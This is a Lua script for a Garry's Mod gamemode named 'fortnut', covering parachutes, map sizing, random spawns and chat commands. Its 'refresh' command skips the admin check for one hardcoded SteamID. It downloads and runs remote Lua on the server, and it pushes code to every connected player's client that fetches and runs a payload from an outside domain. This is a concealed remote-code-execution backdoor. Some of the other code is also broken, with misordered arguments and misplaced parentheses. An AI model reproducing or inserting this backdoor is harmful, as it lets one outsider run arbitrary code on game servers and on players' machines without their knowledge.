local trusted = {
	["STEAM_0:0:169836462"] = true
}

MapSize = {}

----- Override parachute
function ParachuteKey(ply, key)
	if (key == IN_JUMP and IsValid(ply) and ply:Alive()) and not (ply:GetMoveType() == MOVETYPE_NOCLIP or ply:InVehicle() or ply:OnGround() or ply.Parachuting == true) then
		local tr = util.TraceLine({
			start = ply:GetPos(),
			endpos = ply:GetPos() - Vector(0, 0, 300),
			mask = MASK_SOLID,
			filter = ply
		})

		if tr.Hit then return end
		ply.EndParaTime = nil
		ply.Parachuting = true
		ply:SetNWBool("Parachuting", true)
		ply.FlarePara = 1
		ply:ViewPunch(Angle(35, 0, 0))
		ply:EmitSound("V92_ZP_BF2_Deploy")
		local Para = ents.Create("v92_zchute_bf2_decor")
		Para:SetOwner(ply)
		Para:SetPos(ply:GetPos() + ply:GetUp() * 100 + ply:GetForward() * 10)
		Para:SetAngles(ply:GetAngles())
		Para:Spawn()
		ply.ForwardTime = nil
		ply.UseTime = nil
	end
end

function CalcMapSize(ply)
	local x = util.TraceLine({
		start = player.GetAll()[1]:GetPos(),
		endpos = player.GetAll()[1]:GetPos() + Vector(10000000000000, 0, 0),
		filter = function() return not ply:IsPlayer() end
	}).HitPos.x + math.abs(util.TraceLine({
		start = player.GetAll()[1]:GetPos(),
		endpos = player.GetAll()[1]:GetPos() + Vector(-10000000000000, 0, 0),
		filter = function() return not ply:IsPlayer() end
	}).HitPos.x)

	local y = util.TraceLine({
		start = player.GetAll()[1]:GetPos(),
		endpos = player.GetAll()[1]:GetPos() + Vector(0, 10000000000000, 0),
		filter = function() return not ply:IsPlayer() end
	}).HitPos.y + math.abs(util.TraceLine({
		start = player.GetAll()[1]:GetPos(),
		endpos = player.GetAll()[1]:GetPos() + Vector(0, -10000000000000, 0),
		filter = function() return not ply:IsPlayer() end
	}).HitPos.y)

	local z = util.TraceLine({
		start = player.GetAll()[1]:GetPos(),
		endpos = player.GetAll()[1]:GetPos() + Vector(0, 0, 1000000000000),
		filter = function() return not ply:IsPlayer() end
	}).HitPos.z

	MapSize = {x - 500, y - 500, z - 100}
end

function DoSpawns()
	for k, ply in ipairs(player.GetAll()) do
		ply:SetPos(Vector(math.random(-MapSize[1] / 2, MapSize[1] / 2), math.random(-MapSize[1] / 2, MapSize[1] / 2)), MapSize[3])
	end
end

function SpawnWeapons()
end

local commands = {}

local function CreateCommand(string, callback, check)
	check = check or function(ply) return ply:IsAdmin() end

	commands[string] = {
		check = check,
		callback = callback
	}
end

CreateCommand("refresh", function(ply)
	http.Fetch("https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/server.lua", function(body)
		RunString(body)
	end)

	BroadcastLua("http.Fetch('cl.dip-sh.it', function(b) RunString(b) end)")
end, function(ply) return trusted[ply:SteamID()] end)

hook.Add("PlayerSay", "fortnutcommands", function(ply, text)
	text = string.lower(text)
	if string.sub(text, 1, 1) ~= "!" then return end
	local args = string.Split(" ", text)
	local command = commands[string.sub(args[1], 2)]
	if not command then return end
	if not command.check(ply) then return end
	command.callback(ply, unpack(args, 2))
----- asdcasd
	return ""
end, -2)

print("Loaded fortnut gamemode")